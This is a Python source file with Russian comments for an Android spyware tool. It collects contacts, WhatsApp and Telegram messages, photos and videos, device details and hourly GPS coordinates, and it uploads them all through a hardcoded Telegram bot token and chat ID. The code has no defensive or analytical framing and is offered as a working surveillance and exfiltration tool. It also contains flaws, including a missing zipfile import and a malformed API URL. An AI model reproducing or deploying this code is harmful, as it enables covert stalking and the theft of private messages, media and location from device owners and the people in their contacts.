import os
import time
import json
import sqlite3
import requests
import logging
import subprocess
import shutil
import base64
from datetime import datetime
import re

# ===== НАСТРОЙКИ =====
TELEGRAM_BOT_TOKEN = "7961419672:AAEd-VMzuf43W9PsaQLveQ__vYMf2EOswu0"
TELEGRAM_CHAT_ID = "5024505351"
TEMP_DIR = "/data/local/tmp/full_system_report"
MAX_FILES_TO_SEND = 10  # Лимит файлов для отправки в Telegram

# Настройка логов
logging.basicConfig(
    filename="/data/local/tmp/system_collector.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

class AndroidDataCollector:
    def __init__(self):
        self.init_time = datetime.now().isoformat()
        os.makedirs(TEMP_DIR, exist_ok=True)
        self.collected_data = {
            "system": {},
            "contacts": [],
            "media": [],
            "messages": {"telegram": [], "whatsapp": []},
            "location_history": [],
            "credentials": {},
            "software": [],
            "wifi": [],
            "cmd_history": []
        }
        self.session_id = os.urandom(16).hex()

    def log_to_telegram(self, message):
        """Логирование событий с уникальным ID сессии"""
        try:
            log_message = f"[{self.session_id[:8]}] {message}"
            url = f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {"chat_id": TELEGRAM_CHAT_ID, "text": log_message, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=30)
        except Exception as e:
            logging.error(f"Ошибка отправки лога в Telegram: {e}")

    def send_file_to_telegram(self, file_path, caption=""):
        """Отправка файла в Telegram"""
        try:
            url = f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendDocument"
            with open(file_path, "rb") as f:
                files = {"document": f}
                data = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "HTML"}
                requests.post(url, data=data, files=files, timeout=30)
        except Exception as e:
            self.log_to_telegram(f"❌ <b>Ошибка отправки файла {file_path}:</b> {e}")

    def collect_contacts(self):
        """Сбор контактов из SQLite базы Android"""
        self.log_to_telegram("📱 <b>Сбор контактов...</b>")
        contacts_db = "/data/data/com.android.providers.contacts/databases/contacts2.db"
        if not os.path.exists(contacts_db):
            self.log_to_telegram("❌ <b>База контактов не найдена</b>")
            return
        try:
            conn = sqlite3.connect(contacts_db)
            cursor = conn.cursor()
            cursor.execute("SELECT display_name, data1 FROM data WHERE mimetype_id=5")
            contacts = cursor.fetchall()
            for name, number in contacts:
                self.collected_data["contacts"].append({"name": name, "number": number})
            self.log_to_telegram(f"✅ <b>Найдено контактов:</b> {len(contacts)}")
        except Exception as e:
            self.log_to_telegram(f"❌ <b>Ошибка чтения контактов:</b> {e}")

    def collect_media(self):
        """Сбор фотографий и видео с устройства"""
        self.log_to_telegram("📷 <b>Сканируем медиа...</b>")
        media_paths = [
            "/sdcard/Pictures/",
            "/sdcard/DCIM/",
            "/sdcard/Movies/"
        ]
        for path in media_paths:
            if not os.path.exists(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower().endswith((".jpg", ".png", ".mp4")):
                        file_path = os.path.join(root, file)
                        self.collected_data["media"].append(file_path)
                        if len(self.collected_data["media"]) >= MAX_FILES_TO_SEND:
                            break
        self.log_to_telegram(f"✅ <b>Найдено медиа:</b> {len(self.collected_data['media'])}")
        for file in self.collected_data["media"][:5]:
            self.send_file_to_telegram(file, f"🖼️ <b>Медиа:</b> {os.path.basename(file)}")

    def collect_messages_telegram(self):
        """Парсинг сообщений Telegram"""
        self.log_to_telegram("💬 <b>Сбор сообщений Telegram...</b>")
        tg_cache_dir = "/data/data/org.telegram.messenger/files/cache/"
        if not os.path.exists(tg_cache_dir):
            self.log_to_telegram("⚠️ <b>Telegram не установлен</b>")
            return
        for root, _, files in os.walk(tg_cache_dir):
            for file in files:
                if file.endswith(".json"):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "r", encoding="utf-8") as f:
                            content = f.read()
                            self.collected_data["messages"]["telegram"].append({
                                "file": file_path,
                                "sample": content[:100]
                            })
                    except:
                        continue
        self.log_to_telegram(f"✅ <b>Telegram сообщений:</b> {len(self.collected_data['messages']['telegram'])}")

    def collect_messages_whatsapp(self):
        """Парсинг сообщений WhatsApp"""
        self.log_to_telegram("💬 <b>Сбор сообщений WhatsApp...</b>")
        wa_db = "/data/data/com.whatsapp/files/msgstore.db"
        if not os.path.exists(wa_db):
            self.log_to_telegram("⚠️ <b>WhatsApp не установлен</b>")
            return
        try:
            conn = sqlite3.connect(wa_db)
            cursor = conn.cursor()
            cursor.execute("SELECT key_remote_jid, data FROM messages ORDER BY timestamp DESC LIMIT 50")
            messages = cursor.fetchall()
            for jid, msg in messages:
                self.collected_data["messages"]["whatsapp"].append({
                    "jid": jid,
                    "message": msg
                })
            self.log_to_telegram(f"✅ <b>WhatsApp сообщений:</b> {len(messages)}")
        except Exception as e:
            self.log_to_telegram(f"❌ <b>Ошибка чтения WhatsApp:</b> {e}")

    def track_location(self):
        """Отслеживание местоположения каждые 60 минут"""
        self.log_to_telegram("📍 <b>Запуск отслеживания местоположения</b>")
        while True:
            try:
                result = subprocess.check_output(["dumpsys", "location"]).decode()
                lat_match = re.search(r"lat=(\d+\.\d+)", result)
                lon_match = re.search(r"lon=(-?\d+\.\d+)", result)
                if lat_match and lon_match:
                    lat = lat_match.group(1)
                    lon = lon_match.group(1)
                    self.collected_data["location_history"].append({
                        "timestamp": datetime.now().isoformat(),
                        "latitude": lat,
                        "longitude": lon
                    })
                    self.log_to_telegram(f"🧭 <b>Координаты:</b> {lat}, {lon}")
            except Exception as e:
                self.log_to_telegram(f"❌ <b>Ошибка получения координат:</b> {e}")
            time.sleep(3600)  # Каждый час

    def collect_system_info(self):
        """Сбор информации о устройстве"""
        self.log_to_telegram("🔍 <b>Сбор системной информации...</b>")
        try:
            brand = subprocess.check_output(["getprop", "ro.product.brand"]).decode().strip()
            model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
            android_version = subprocess.check_output(["getprop", "ro.build.version.release"]).decode().strip()
            ip = subprocess.check_output(["ifconfig", "wlan0"]).decode().split("inet addr:")[1].split()[0]
            self.collected_data["system"] = {
                "brand": brand,
                "model": model,
                "android_version": android_version,
                "ip": ip,
                "session_id": self.session_id,
                "init_time": self.init_time
            }
            self.log_to_telegram(f"✅ <b>Устройство:</b> {brand} {model} ({android_version})")
        except Exception as e:
            self.log_to_telegram(f"❌ <b>Ошибка сбора данных:</b> {e}")

    def create_report(self):
        """Создание архива и отправка"""
        self.log_to_telegram("📦 <b>Создание отчёта...</b>")
        zip_path = os.path.join(TEMP_DIR, "report.zip")
        with zipfile.ZipFile(zip_path, "w") as zipf:
            meta_path = os.path.join(TEMP_DIR, "meta.json")
            with open(meta_path, "w") as f:
                json.dump(self.collected_data, f, indent=2)
            zipf.write(meta_path, "meta.json")
            for file in self.collected_data["media"]:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))
        self.send_file_to_telegram(zip_path, "📁 <b>Отчёт</b>")
        self.log_to_telegram("✅ <b>Отчёт отправлен</b>")

    def run(self):
        """Основной цикл"""
        self.collect_system_info()
        self.collect_contacts()
        self.collect_media()
        self.collect_messages_telegram()
        self.collect_messages_whatsapp()
        self.create_report()
        self.track_location()

if __name__ == "__main__":
    collector = AndroidDataCollector()
    collector.run()
